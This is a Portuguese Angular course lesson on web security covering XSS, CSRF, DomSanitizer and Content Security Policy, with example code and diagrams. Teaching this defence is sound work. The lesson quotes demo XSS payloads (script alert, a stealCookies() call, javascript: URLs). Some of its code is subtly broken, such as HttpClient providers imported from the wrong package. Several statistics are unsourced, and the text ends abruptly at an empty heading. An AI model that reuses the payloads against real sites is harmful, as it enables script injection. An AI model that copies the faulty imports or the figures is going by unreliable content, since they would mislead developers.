---
layout: lesson
title: "Aula 5.3: Segurança Avançada"
slug: seguranca
module: module-5
lesson_id: lesson-5-3
duration: "60 minutos"
level: "Expert"
prerequisites: []
exercises: []
permalink: /modules/praticas-avancadas-projeto-final/lessons/seguranca/
---

## Introdução

Nesta aula, você dominará segurança avançada em aplicações Angular, desde proteção contra vulnerabilidades comuns até implementação de autenticação e autorização robustas. Segurança não é um recurso adicional - é uma responsabilidade fundamental de todo desenvolvedor profissional.

### Contexto Histórico e Evolução da Segurança Web

A história da segurança web reflete uma batalha constante entre desenvolvedores e atacantes:

#### Era Pré-Framework (1995-2010) - Vulnerabilidades Explícitas
- **XSS**: Descoberto em 1995, mas amplamente ignorado até 2000
- **CSRF**: Identificado em 2001, mas proteção não era padrão
- **Problema**: Desenvolvedores precisavam implementar proteções manualmente
- **Resultado**: Aplicações web eram extremamente vulneráveis

#### AngularJS (2010-2016) - Primeiras Proteções Automáticas
- **Sanitization Básica**: AngularJS introduziu sanitização automática em templates
- **Limitação**: Proteção não era completa, ainda vulnerável a bypasses
- **Problema**: Desenvolvedores podiam facilmente desabilitar proteções
- **Avanço**: Framework começou a pensar em segurança por padrão

#### Angular 2+ (2016) - Segurança por Design
- **Sanitization Robusta**: DomSanitizer com múltiplos contextos de segurança
- **CSRF Protection**: Suporte integrado no HttpClient
- **CSP Compatible**: Angular funciona com Content Security Policy strict
- **Avanço**: Segurança não é mais opcional, é padrão

#### Angular 4-12 - Melhorias Incrementais
- **HttpOnly Cookies**: Melhor suporte para armazenamento seguro
- **JWT Integration**: Padrão de autenticação amplamente adotado
- **OAuth2/OIDC**: Bibliotecas maduras para autenticação social
- **Avanço**: Ferramentas para implementar segurança avançada

#### Angular 13+ - Segurança Moderna
- **Standalone Security**: Guards e interceptors funcionam sem NgModules
- **Signals Security**: Proteção para novos padrões reativos
- **SSR Security**: Proteções específicas para Server-Side Rendering
- **Avanço**: Segurança adaptada para arquiteturas modernas

#### OWASP Top 10 - Evolução das Ameaças
- **2013**: XSS e CSRF eram top 3
- **2017**: Ameaças evoluíram, mas XSS permaneceu relevante
- **2021**: Injection attacks ainda dominam, mas autenticação quebrada subiu
- **2024**: API security e configurações inseguras ganharam destaque

### O que você vai aprender

- **Proteção contra XSS**: Entender como Angular sanitiza automaticamente e quando usar DomSanitizer
- **Proteção contra CSRF**: Configurar tokens CSRF e entender o fluxo de proteção
- **Sanitization Avançada**: Dominar DomSanitizer e SecurityContext para casos especiais
- **Content Security Policy**: Configurar CSP strict e entender como Angular funciona com CSP
- **Autenticação JWT**: Implementar autenticação baseada em tokens de forma segura
- **OAuth2 e OpenID Connect**: Integrar autenticação social e federada
- **Role-Based Access Control**: Criar sistema completo de autorização com guards e diretivas
- **Armazenamento Seguro**: Entender trade-offs entre localStorage, sessionStorage e httpOnly cookies
- **HTTPS e CORS**: Configurar comunicação segura e entender políticas de origem cruzada

### Por que isso é importante

Segurança não é negociável. Uma única vulnerabilidade pode comprometer milhões de usuários, causar perdas financeiras massivas e destruir a confiança em uma aplicação. Mas segurança também não precisa ser complexa - Angular fornece ferramentas poderosas que tornam proteção acessível.

**Impacto Real**:
- **Proteção de Dados**: Prevenir roubo de informações sensíveis de usuários
- **Integridade**: Garantir que ações maliciosas não comprometam a aplicação
- **Conformidade**: Atender requisitos legais (LGPD, GDPR) para proteção de dados
- **Confiança**: Usuários confiam em aplicações que demonstram cuidado com segurança
- **Custo**: Prevenir ataques é muito mais barato que remediar após incidente

**Impacto na Carreira**: Desenvolvedores que dominam segurança são capazes de:
- Criar aplicações que passam em auditorias de segurança
- Trabalhar em projetos críticos que lidam com dados sensíveis
- Entender e mitigar vulnerabilidades antes que sejam exploradas
- Implementar autenticação e autorização robustas
- Educar equipes sobre boas práticas de segurança

**Estatísticas Alarmantes**:
- 94% das aplicações web têm pelo menos uma vulnerabilidade (OWASP)
- XSS representa 40% de todas as vulnerabilidades web (Veracode)
- CSRF pode ser explorado em 75% das aplicações sem proteção adequada
- Ataques de autenticação quebrada aumentaram 200% desde 2020

**A Realidade**: Não é questão de "se" sua aplicação será atacada, mas "quando". A diferença entre uma aplicação segura e insegura não é se ela tem vulnerabilidades, mas se essas vulnerabilidades podem ser exploradas.

---

## Conceitos Teóricos

### Proteção contra XSS

**Definição**: XSS (Cross-Site Scripting) é uma vulnerabilidade que permite a injeção de scripts maliciosos em páginas web, permitindo que atacantes executem código JavaScript no contexto de outro usuário, potencialmente roubando cookies, sessões ou dados sensíveis.

**Explicação Detalhada**:

XSS é uma das vulnerabilidades mais comuns e perigosas em aplicações web. Existem três tipos principais:

**1. XSS Refletido (Reflected XSS)**:
- Script malicioso é injetado através de parâmetros de URL ou formulários
- O script é refletido imediatamente na resposta do servidor
- Exemplo: `https://site.com/search?q=<script>alert('XSS')</script>`
- Mais fácil de explorar, mas requer que usuário clique em link malicioso

**2. XSS Armazenado (Stored XSS)**:
- Script malicioso é armazenado no servidor (banco de dados, comentários, etc.)
- Toda vez que o conteúdo é exibido, o script é executado
- Mais perigoso porque afeta todos os usuários que visualizam o conteúdo
- Exemplo: Comentário em blog contendo `<script>stealCookies()</script>`

**3. XSS Baseado em DOM (DOM-based XSS)**:
- Script malicioso manipula o DOM diretamente no cliente
- Não requer interação com servidor
- Mais difícil de detectar e prevenir
- Exemplo: `document.location.hash` sendo inserido no DOM sem sanitização

**Como Angular Protege Automaticamente**:

Angular implementa proteção XSS em múltiplas camadas:

**Camada 1 - Interpolação Segura**:
- `{{ userInput }}` automaticamente escapa caracteres perigosos
- `<`, `>`, `&`, `"`, `'` são convertidos em entidades HTML
- Scripts injetados são tratados como texto, não como código executável

**Camada 2 - Property Binding Seguro**:
- `[innerHTML]="value"` requer sanitização explícita
- Angular bloqueia scripts por padrão
- Apenas tags HTML seguras são permitidas

**Camada 3 - DomSanitizer**:
- Para casos especiais onde HTML confiável precisa ser renderizado
- Múltiplos contextos: HTML, Style, Script, URL, ResourceURL
- Cada contexto tem regras específicas de sanitização

**Fluxo de Sanitização Angular**:

```
┌─────────────────────────────────────────────────────────────┐
│              Angular XSS Protection Flow                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  User Input                                                 │
│      │                                                      │
│      ▼                                                      │
│  ┌──────────────────────┐                                  │
│  │  Interpolation       │  {{ userInput }}                 │
│  │  Auto-escaping       │                                  │
│  └──────────┬───────────┘                                  │
│             │                                               │
│             ▼                                               │
│  ┌──────────────────────┐                                  │
│  │  HTML Entity         │  < → &lt;                        │
│  │  Encoding            │  > → &gt;                        │
│  │                      │  & → &amp;                       │
│  └──────────┬───────────┘                                  │
│             │                                               │
│             ▼                                               │
│  ┌──────────────────────┐                                  │
│  │  Safe HTML           │  Rendered as text                │
│  │  Rendering           │  Not executable                  │
│  └──────────────────────┘                                  │
│                                                             │
│  Alternative Path (innerHTML):                              │
│      │                                                      │
│      ▼                                                      │
│  ┌──────────────────────┐                                  │
│  │  DomSanitizer        │  Sanitize HTML                   │
│  │  SecurityContext     │  Remove dangerous tags           │
│  └──────────┬───────────┘                                  │
│             │                                               │
│             ▼                                               │
│  ┌──────────────────────┐                                  │
│  │  SafeHtml            │  Trusted HTML only               │
│  │  Rendering           │  Scripts blocked                │
│  └──────────────────────┘                                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Analogia Detalhada**:

Proteção XSS é como um sistema de segurança em múltiplas camadas de um banco:

{% raw %}
**Interpolação Angular (`{{ }}`)** é como a porta principal do banco - ela automaticamente verifica cada pessoa que entra, escaneia bolsas e detecta objetos perigosos. Mesmo que alguém tente entrar com uma arma escondida, o sistema detecta e neutraliza antes que entre no banco.
{% endraw %}

**DomSanitizer** é como o cofre especial do banco - quando você precisa guardar algo valioso (HTML confiável), você passa por verificações ainda mais rigorosas. O sistema verifica cada item individualmente, remove qualquer coisa suspeita, e só então permite que o conteúdo seja guardado. Mas mesmo assim, o conteúdo nunca pode ser executado como código - apenas exibido de forma segura.

**XSS sem proteção** é como deixar a porta do banco aberta com um cartaz dizendo "Bem-vindos, entrem livremente". Qualquer pessoa pode entrar, fazer o que quiser, e sair com tudo que conseguir carregar.

**Exemplo Prático**:

```typescript
import { Component, inject } from '@angular/core';
import { DomSanitizer, SafeHtml, SecurityContext } from '@angular/platform-browser';

@Component({
  selector: 'app-safe',
  standalone: true,
  template: `
    <div class="content">
      <h2>Safe Interpolation</h2>
      <p>{{ userInput }}</p>
      
      <h2>Unsafe innerHTML (Blocked)</h2>
      <div [innerHTML]="userInput"></div>
      
      <h2>Sanitized innerHTML</h2>
      <div [innerHTML]="safeHtml"></div>
      
      <h2>Trusted HTML</h2>
      <div [innerHTML]="trustedHtml"></div>
    </div>
  `
})
export class SafeComponent {
  private sanitizer = inject(DomSanitizer);
  
  userInput = '<script>alert("XSS Attack!")</script><p>Safe content</p>';
  
  safeHtml: SafeHtml = this.sanitizer.sanitize(
    SecurityContext.HTML,
    '<p>This is <strong>safe</strong> HTML</p>'
  );
  
  trustedHtml: SafeHtml = this.sanitizer.bypassSecurityTrustHtml(
    '<p>This HTML is <strong>trusted</strong> - use with caution!</p>'
  );
}
```

**Tabela Comparativa: Proteção XSS entre Frameworks**:

| Framework | Proteção Padrão | Sanitização Automática | DomSanitizer Equivalente | Nível de Segurança |
|-----------|----------------|----------------------|-------------------------|-------------------|
| **Angular** | ✅ Completa | ✅ Interpolação e binding | ✅ DomSanitizer com múltiplos contextos | ⭐⭐⭐⭐⭐ |
| **React** | ✅ Completa | ✅ JSX escapa automaticamente | ⚠️ dangerouslySetInnerHTML (manual) | ⭐⭐⭐⭐ |
| **Vue** | ✅ Completa | ✅ Templates escapa automaticamente | ⚠️ v-html (requer cuidado) | ⭐⭐⭐⭐ |
| **Svelte** | ✅ Completa | ✅ Templates escapa automaticamente | ⚠️ {@html} (requer cuidado) | ⭐⭐⭐⭐ |
| **Vanilla JS** | ❌ Nenhuma | ❌ Manual | ❌ Manual (DOMPurify recomendado) | ⭐ |

**Pontos Críticos**:

1. **Nunca use `innerHTML` sem sanitização** - mesmo com conteúdo "confiável", sempre sanitize
2. **Evite `eval()` e `Function()`** - nunca execute código dinâmico de strings
3. **Cuidado com `bypassSecurityTrust*`** - use apenas quando absolutamente necessário e com conteúdo 100% confiável
4. **Valide no backend também** - frontend pode ser contornado, sempre valide no servidor
5. **Use CSP** - Content Security Policy adiciona camada extra de proteção

---

### Proteção contra CSRF

**Definição**: CSRF (Cross-Site Request Forgery) é um ataque que força um usuário autenticado a executar ações não intencionais em uma aplicação web na qual está autenticado, explorando a confiança que o servidor tem no navegador do usuário.

**Explicação Detalhada**:

CSRF explora o fato de que navegadores enviam cookies automaticamente com cada requisição, incluindo requisições originadas de outros sites. Se um usuário está autenticado no Site A e visita o Site B malicioso, o Site B pode fazer requisições para o Site A usando as credenciais do usuário.

**Como CSRF Funciona**:

```
┌─────────────────────────────────────────────────────────────┐
│              CSRF Attack Flow                                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. User logs into Bank.com                                 │
│     ┌──────────────┐                                        │
│     │  Bank.com    │  Session cookie stored                 │
│     │  (Logged in) │  auth_token=abc123                     │
│     └──────────────┘                                        │
│                                                             │
│  2. User visits Evil.com                                    │
│     ┌──────────────┐                                        │
│     │  Evil.com    │  Contains malicious form:              │
│     │              │  <form action="Bank.com/transfer">     │
│     └──────────────┘                                        │
│                                                             │
│  3. Form auto-submits                                       │
│     ┌──────────────────────────────────────┐               │
│     │  Browser sends request to Bank.com    │               │
│     │  Includes: auth_token=abc123           │               │
│     │  Bank.com thinks: "User wants this"   │               │
│     └──────────────────────────────────────┘               │
│                                                             │
│  4. Attack succeeds                                        │
│     ┌──────────────┐                                        │
│     │  Money       │  Transferred without user consent      │
│     │  Transferred │                                        │
│     └──────────────┘                                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Estratégias de Proteção**:

**1. CSRF Tokens (Double Submit Cookie)**:
- Servidor gera token único para cada sessão
- Token é enviado como cookie e como header/form field
- Servidor valida que ambos valores coincidem
- Atacante não pode ler cookie (SameSite) nem adivinhar token

**2. SameSite Cookies**:
- Cookie só é enviado em requisições do mesmo site
- `SameSite=Strict`: Nunca enviado em requisições cross-site
- `SameSite=Lax`: Enviado apenas em navegação top-level (GET)
- `SameSite=None`: Requer HTTPS e Secure flag

**3. Verificação de Origem (Origin/Referer)**:
- Servidor verifica header `Origin` ou `Referer`
- Deve corresponder ao domínio esperado
- Não funciona se header é removido ou modificado

**4. Headers Customizados**:
- Requisições devem incluir header customizado
- Browsers não permitem headers customizados em requisições cross-site (CORS)
- Exemplo: `X-Requested-With: XMLHttpRequest`

**Como Angular Protege**:

Angular HttpClient tem suporte integrado para CSRF tokens:

**Fluxo de Proteção Angular CSRF**:

```
┌─────────────────────────────────────────────────────────────┐
│          Angular CSRF Protection Flow                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Server sends CSRF token                                │
│     ┌──────────────────────────────────────┐               │
│     │  Set-Cookie: XSRF-TOKEN=abc123       │               │
│     │  (HttpOnly: false for Angular read)  │               │
│     └──────────────────────────────────────┘               │
│                                                             │
│  2. Angular reads cookie                                   │
│     ┌──────────────────────────────────────┐               │
│     │  HttpClient reads XSRF-TOKEN        │               │
│     │  Stores token internally             │               │
│     └──────────────────────────────────────┘               │
│                                                             │
│  3. Request automatically includes token                  │
│     ┌──────────────────────────────────────┐               │
│     │  POST /api/data                      │               │
│     │  Header: X-XSRF-TOKEN: abc123        │               │
│     │  Cookie: XSRF-TOKEN=abc123           │               │
│     └──────────────────────────────────────┘               │
│                                                             │
│  4. Server validates                                       │
│     ┌──────────────────────────────────────┐               │
│     │  Compare header vs cookie            │               │
│     │  If match: Request allowed           │               │
│     │  If mismatch: Request rejected       │               │
│     └──────────────────────────────────────┘               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Analogia Detalhada**:

CSRF é como alguém tentando fazer uma transferência bancária em seu nome:

**Sem proteção CSRF** é como ter um banco que aceita qualquer ordem escrita, mesmo que não tenha sua assinatura. Se alguém escrever uma ordem falsa e enviar ao banco, o banco pode processar porque não verifica se realmente veio de você.

**CSRF Token** é como ter um código secreto que só você e o banco conhecem. Quando você faz uma transferência, você inclui esse código. Se alguém tentar fazer uma transferência sem o código (ou com código errado), o banco rejeita. Como o código está em um cookie que o site malicioso não pode ler, o atacante não consegue obter o código correto.

**SameSite Cookie** é como ter um cofre que só abre quando você está fisicamente no banco. Mesmo que alguém tenha sua chave, ela não funciona de longe - só funciona quando você está no local correto.

**Exemplo Prático Completo**:

```typescript
import { ApplicationConfig, provideHttpClient, withXsrfConfiguration } from '@angular/platform-browser';
import { HttpClient } from '@angular/common/http';
import { Injectable, inject } from '@angular/core';

export const appConfig: ApplicationConfig = {
  providers: [
    provideHttpClient(
      withXsrfConfiguration({
        cookieName: 'XSRF-TOKEN',
        headerName: 'X-XSRF-TOKEN'
      })
    )
  ]
};

@Injectable({
  providedIn: 'root'
})
export class DataService {
  private http = inject(HttpClient);
  
  saveData(data: any) {
    return this.http.post('/api/data', data);
  }
  
  deleteData(id: string) {
    return this.http.delete(`/api/data/${id}`);
  }
}
```

**Configuração no Backend (Node.js/Express exemplo)**:

```typescript
import express from 'express';
import cookieParser from 'cookie-parser';
import csrf from 'csurf';

const app = express();
app.use(cookieParser());

const csrfProtection = csrf({ cookie: true });

app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.cookie('XSRF-TOKEN', req.csrfToken(), {
    httpOnly: false,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict'
  });
  res.json({ csrfToken: req.csrfToken() });
});

app.post('/api/data', csrfProtection, (req, res) => {
  res.json({ success: true });
});
```

**Tabela Comparativa: Proteção CSRF entre Frameworks**:

| Framework | Proteção Integrada | Configuração | SameSite Support | Nível de Proteção |
|-----------|-------------------|--------------|------------------|-------------------|
| **Angular** | ✅ HttpClient | ✅ Simples (withXsrfConfiguration) | ✅ Sim | ⭐⭐⭐⭐⭐ |
| **React** | ❌ Manual | ⚠️ Requer biblioteca (axios-csrf) | ✅ Sim | ⭐⭐⭐ |
| **Vue** | ❌ Manual | ⚠️ Requer biblioteca | ✅ Sim | ⭐⭐⭐ |
| **Svelte** | ❌ Manual | ⚠️ Requer biblioteca | ✅ Sim | ⭐⭐⭐ |
| **Next.js** | ✅ Built-in | ✅ Automático em API routes | ✅ Sim | ⭐⭐⭐⭐ |

**Pontos Críticos**:

1. **CSRF tokens devem ser únicos por sessão** - não reutilize tokens entre usuários
2. **Tokens devem ser aleatórios e imprevisíveis** - use geradores criptograficamente seguros
3. **Valide tokens em todas as operações de estado** - GET geralmente é seguro, mas POST/PUT/DELETE precisam validação
4. **Combine múltiplas estratégias** - tokens + SameSite + verificação de origem
5. **Teste proteção CSRF** - verifique que requisições sem token são rejeitadas

---

### Sanitization e DomSanitizer

**Definição**: Sanitization é o processo de remover ou neutralizar código potencialmente perigoso de conteúdo HTML, CSS, JavaScript ou URLs antes de inserir no DOM, prevenindo execução de código malicioso.

**Explicação Detalhada**:

Sanitization é a primeira linha de defesa contra XSS. Angular implementa sanitização em múltiplos níveis, cada um apropriado para diferentes contextos de segurança.

**SecurityContext - Contextos de Segurança**:

Angular define diferentes contextos de segurança, cada um com regras específicas:

**1. SecurityContext.NONE**:
- Nenhuma sanitização aplicada
- Use apenas para dados completamente confiáveis
- Raramente necessário

**2. SecurityContext.HTML**:
- Remove tags e atributos perigosos
- Permite tags seguras: `<p>`, `<div>`, `<span>`, `<strong>`, etc.
- Remove: `<script>`, `<iframe>`, `onclick`, `javascript:`, etc.
- Usado em `[innerHTML]`

**3. SecurityContext.STYLE**:
- Remove propriedades CSS perigosas
- Permite CSS seguro
- Remove: `expression()`, `javascript:`, `url(javascript:)`, etc.
- Usado em `[style]` binding

**4. SecurityContext.SCRIPT**:
- Bloqueia completamente scripts
- Nunca permita scripts dinâmicos
- Usado em `<script>` tags (raramente)

**5. SecurityContext.URL**:
- Valida e sanitiza URLs
- Remove `javascript:`, `data:` perigosos
- Permite `http:`, `https:`, `mailto:`, etc.
- Usado em `[href]`, `[src]`

**6. SecurityContext.RESOURCE_URL**:
- Mais restritivo que URL
- Apenas URLs de recursos confiáveis
- Usado em `<iframe src>`, `<embed src>`

**Fluxo de Sanitização por Contexto**:

```
┌─────────────────────────────────────────────────────────────┐
│          Angular Sanitization by Context                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Input: <script>alert('XSS')</script><p>Safe</p>          │
│      │                                                      │
│      ├──────────────────────────────────────────────────┐  │
│      │                                                  │  │
│      ▼                                                  ▼  │
│  ┌──────────────────┐                          ┌──────────┐│
│  │ SecurityContext │                          │Security   ││
│  │ .HTML           │                          │Context    ││
│  │                  │                          │.URL       ││
│  │ Removes:         │                          │           ││
│  │ - <script>       │                          │ Removes:  ││
│  │ - onclick        │                          │ - javascript:│
│  │ - javascript:    │                          │ - data:   ││
│  │                  │                          │           ││
│  │ Keeps:           │                          │ Keeps:   ││
│  │ - <p>Safe</p>    │                          │ - https://│
│  └──────────────────┘                          └──────────┘│
│                                                             │
│  Output: <p>Safe</p>                                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Tipos Seguros (Safe Types)**:

Angular fornece tipos que indicam que conteúdo foi sanitizado ou é confiável:

**SafeHtml**: HTML que pode ser inserido via `[innerHTML]`
**SafeStyle**: CSS que pode ser usado em `[style]`
**SafeScript**: Script que pode ser executado (raramente usado)
**SafeUrl**: URL que pode ser usada em `[href]` ou `[src]`
**SafeResourceUrl**: URL de recurso para `<iframe>`, `<embed>`

**Métodos do DomSanitizer**:

**1. `sanitize(context, value)`**:
- Sanitiza valor de acordo com contexto
- Retorna string sanitizada
- Remove código perigoso automaticamente

**2. `bypassSecurityTrustHtml(value)`**:
- Marca HTML como confiável SEM sanitização
- ⚠️ Use apenas com conteúdo 100% confiável
- Retorna `SafeHtml`

**3. `bypassSecurityTrustStyle(value)`**:
- Marca CSS como confiável
- ⚠️ Use com cuidado
- Retorna `SafeStyle`

**4. `bypassSecurityTrustScript(value)`**:
- Marca script como confiável
- ⚠️ Extremamente perigoso, evite
- Retorna `SafeScript`

**5. `bypassSecurityTrustUrl(value)`**:
- Marca URL como confiável
- Use apenas com URLs conhecidas e validadas
- Retorna `SafeUrl`

**6. `bypassSecurityTrustResourceUrl(value)`**:
- Marca resource URL como confiável
- Para `<iframe>`, `<embed>`
- Retorna `SafeResourceUrl`

**Analogia Detalhada**:

Sanitization é como um sistema de filtragem de água em múltiplas etapas:

**SecurityContext** são como diferentes tipos de filtros para diferentes usos:
- **HTML Context** é como um filtro de água potável - remove bactérias e vírus, mas mantém minerais saudáveis
- **URL Context** é como um filtro de piscina - remove produtos químicos perigosos, mas mantém água tratada
- **Style Context** é como um filtro de ar condicionado - remove poluentes, mas mantém ar respirável

**DomSanitizer.sanitize()** é como passar água por todos os filtros apropriados automaticamente. Você coloca água não tratada, e sai água segura para o uso pretendido.

**bypassSecurityTrust*** é como pular todos os filtros e usar água diretamente da fonte. Só faça isso se você conhece a fonte perfeitamente e tem 100% de certeza que é segura. Se errar, você pode envenenar todo o sistema.

**Exemplo Prático Completo**:

```typescript
import { Component, inject } from '@angular/core';
import { 
  DomSanitizer, 
  SafeHtml, 
  SafeStyle, 
  SafeUrl,
  SafeResourceUrl,
  SecurityContext 
} from '@angular/platform-browser';

@Component({
  selector: 'app-sanitize',
  standalone: true,
  template: `
    <div class="container">
      <h2>HTML Sanitization</h2>
      <div [innerHTML]="sanitizedHtml"></div>
      
      <h2>Trusted HTML (Use with caution!)</h2>
      <div [innerHTML]="trustedHtml"></div>
      
      <h2>Style Sanitization</h2>
      <div [style]="sanitizedStyle">Styled content</div>
      
      <h2>URL Sanitization</h2>
      <a [href]="sanitizedUrl">Safe Link</a>
      
      <h2>Resource URL</h2>
      <iframe [src]="safeResourceUrl" width="400" height="300"></iframe>
    </div>
  `
})
export class SanitizeComponent {
  private sanitizer = inject(DomSanitizer);
  
  dangerousHtml = '<script>alert("XSS")</script><p>Safe paragraph</p>';
  dangerousStyle = 'background-image: url(javascript:alert("XSS"))';
  dangerousUrl = 'javascript:alert("XSS")';
  
  sanitizedHtml: SafeHtml = this.sanitizer.sanitize(
    SecurityContext.HTML,
    this.dangerousHtml
  );
  
  trustedHtml: SafeHtml = this.sanitizer.bypassSecurityTrustHtml(
    '<p>This HTML is <strong>trusted</strong> - only use with verified content!</p>'
  );
  
  sanitizedStyle: SafeStyle = this.sanitizer.sanitize(
    SecurityContext.STYLE,
    'color: red; font-weight: bold;'
  );
  
  sanitizedUrl: SafeUrl = this.sanitizer.sanitize(
    SecurityContext.URL,
    'https://angular.io'
  );
  
  safeResourceUrl: SafeResourceUrl = this.sanitizer.bypassSecurityTrustResourceUrl(
    'https://www.youtube.com/embed/dQw4w9WgXcQ'
  );
}
```

**Tabela Comparativa: Sanitization entre Frameworks**:

| Framework | Sanitização Automática | Contextos Múltiplos | Safe Types | Biblioteca Externa Necessária |
|-----------|----------------------|---------------------|------------|------------------------------|
| **Angular** | ✅ Completa | ✅ 6 contextos | ✅ 5 tipos | ❌ Built-in |
| **React** | ✅ JSX escape | ❌ Apenas HTML | ❌ Não | ⚠️ DOMPurify para HTML |
| **Vue** | ✅ Template escape | ❌ Apenas HTML | ❌ Não | ⚠️ DOMPurify para HTML |
| **Svelte** | ✅ Template escape | ❌ Apenas HTML | ❌ Não | ⚠️ DOMPurify para HTML |
| **DOMPurify** | ✅ Completa | ✅ Múltiplos | ❌ Não | ✅ Biblioteca standalone |

**Pontos Críticos**:

1. **Sempre use SecurityContext apropriado** - cada contexto tem regras específicas
2. **Evite bypassSecurityTrust*** quando possível** - prefira sanitização automática
3. **Se usar bypass, valide conteúdo** - verifique origem e conteúdo antes de confiar
4. **Nunca use bypassSecurityTrustScript** - scripts dinâmicos são extremamente perigosos
5. **Teste sanitização** - verifique que conteúdo perigoso é removido
6. **Combine com CSP** - Content Security Policy adiciona camada extra de proteção

---

### Content Security Policy (CSP)

**Definição**: CSP (Content Security Policy) é uma camada adicional de segurança que previne XSS e outros ataques de injeção especificando quais fontes de conteúdo são permitidas para serem carregadas e executadas pelo navegador.

**Explicação Detalhada**:

CSP funciona como uma lista de permissões (whitelist) para recursos que podem ser carregados. Quando CSP está ativo, o navegador bloqueia qualquer recurso que não esteja na lista permitida, mesmo que seja injetado via XSS.

**Como CSP Funciona**:

```
┌─────────────────────────────────────────────────────────────┐
│              CSP Protection Flow                              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Browser loads page                                         │
│      │                                                      │
│      ▼                                                      │
│  ┌──────────────────────┐                                   │
│  │  Read CSP header     │  From HTTP header or meta tag    │
│  │  Parse directives    │                                   │
│  └──────────┬───────────┘                                   │
│             │                                               │
│             ▼                                               │
│  ┌──────────────────────┐                                   │
│  │  Resource Request    │  <script src="evil.com/x.js">    │
│  │                      │                                   │
│  └──────────┬───────────┘                                   │
│             │                                               │
│             ▼                                               │
│  ┌──────────────────────┐                                   │
│  │  Check CSP Rules     │  script-src 'self'               │
│  │                      │  evil.com NOT in whitelist       │
│  └──────────┬───────────┘                                   │
│             │                                               │
│             ▼                                               │
│  ┌──────────────────────┐                                   │
│  │  Block Resource      │  Script blocked                  │
│  │  Report Violation    │  (if report-uri configured)      │
│  └──────────────────────┘                                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Diretivas CSP Principais**:

**default-src**: Fallback para outras diretivas não especificadas
**script-src**: Controla quais scripts podem ser executados
**style-src**: Controla quais estilos podem ser aplicados
**img-src**: Controla de onde imagens podem ser carregadas
**connect-src**: Controla para onde requisições AJAX/fetch podem ir
**font-src**: Controla de onde fontes podem ser carregadas
**object-src**: Controla plugins como Flash
**media-src**: Controla áudio e vídeo
**frame-src**: Controla iframes
**base-uri**: Controla valor de `<base>` tag
**form-action**: Controla para onde formulários podem ser enviados
**frame-ancestors**: Controla quem pode embedar sua página (X-Frame-Options)
**report-uri**: Onde enviar relatórios de violação

**Valores Especiais**:

**'self'**: Mesmo origem (mesmo protocolo, domínio e porta)
**'unsafe-inline'**: Permite JavaScript/CSS inline (reduz segurança)
**'unsafe-eval'**: Permite eval() e similares (muito perigoso)
**'none'**: Bloqueia tudo
**'strict-dynamic'**: Permite scripts carregados por scripts confiáveis
**https:** Permite qualquer origem HTTPS
**data:** Permite data URIs

**CSP e Angular**:

Angular foi projetado para funcionar com CSP strict. No entanto, há algumas considerações:

**Problema com 'unsafe-inline'**:
- Angular usa estilos inline para componentes
- Angular pode usar JavaScript inline em alguns casos
- `'unsafe-inline'` reduz segurança significativamente

**Solução - Nonce ou Hash**:
- Use nonces (number used once) para scripts/styles inline
- Angular pode gerar nonces automaticamente
- Servidor inclui nonce no CSP header
- Angular inclui mesmo nonce em scripts/styles inline

**Configuração CSP Strict para Angular**:

```
default-src 'self';
script-src 'self' 'nonce-{SERVER-GENERATED-NONCE}';
style-src 'self' 'nonce-{SERVER-GENERATED-NONCE}';
img-src 'self' data: https:;
font-src 'self' data:;
connect-src 'self' https://api.example.com;
frame-ancestors 'none';
base-uri 'self';
form-action 'self';
```

**Analogia Detalhada**:

CSP é como um sistema de segurança de um prédio comercial:

**Sem CSP** é como ter um prédio sem portaria - qualquer pessoa pode entrar, trazer qualquer coisa, e fazer o que quiser. Se alguém disser "sou entregador" e trazer uma caixa, ninguém verifica o que tem dentro.

**Com CSP** é como ter uma portaria rigorosa com lista de permissões:
- **script-src 'self'** = "Apenas entregadores da nossa empresa podem entrar"
- **'unsafe-inline'** = "Permitir que pessoas entrem sem identificação" (não recomendado)
- **'nonce-{value}'** = "Apenas pessoas com código especial podem entrar"
- **connect-src 'self'** = "Apenas chamadas para nosso escritório são permitidas"

Se alguém tentar entrar sem estar na lista, a segurança bloqueia imediatamente e reporta a tentativa.

**Exemplo Prático Completo**:

**index.html** (Meta tag - para desenvolvimento):
```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Angular App</title>
  <base href="/">
  
  <meta http-equiv="Content-Security-Policy" 
        content="default-src 'self';
                 script-src 'self' 'unsafe-inline' 'unsafe-eval';
                 style-src 'self' 'unsafe-inline';
                 img-src 'self' data: https:;
                 font-src 'self' data:;
                 connect-src 'self' https://api.example.com;">
</head>
<body>
  <app-root></app-root>
</body>
</html>
```

**Server Configuration** (Express.js exemplo):
```typescript
import express from 'express';
import crypto from 'crypto';

const app = express();

app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;
  
  res.setHeader(
    'Content-Security-Policy',
    `default-src 'self';
     script-src 'self' 'nonce-${nonce}';
     style-src 'self' 'nonce-${nonce}';
     img-src 'self' data: https:;
     connect-src 'self' https://api.example.com;
     frame-ancestors 'none';`
  );
  
  next();
});
```

**Angular com Nonce** (angular.json):
```json
{
  "projects": {
    "my-app": {
      "architect": {
        "build": {
          "options": {
            "styles": [],
            "scripts": [],
            "crossOrigin": "anonymous"
          }
        }
      }
    }
  }
}
```

**Tabela Comparativa: CSP Support entre Frameworks**:

| Framework | CSP Compatible | Nonce Support | Hash Support | Configuração Necessária |
|-----------|---------------|---------------|--------------|------------------------|
| **Angular** | ✅ Sim | ✅ Sim (com configuração) | ✅ Sim | ⚠️ Requer nonce/hash para inline |
| **React** | ✅ Sim | ✅ Sim | ✅ Sim | ⚠️ Requer nonce/hash para inline |
| **Vue** | ✅ Sim | ✅ Sim | ✅ Sim | ⚠️ Requer nonce/hash para inline |
| **Svelte** | ✅ Sim | ✅ Sim | ✅ Sim | ⚠️ Requer nonce/hash para inline |
| **Next.js** | ✅ Sim | ✅ Automático | ✅ Automático | ✅ Configuração automática |

**Pontos Críticos**:

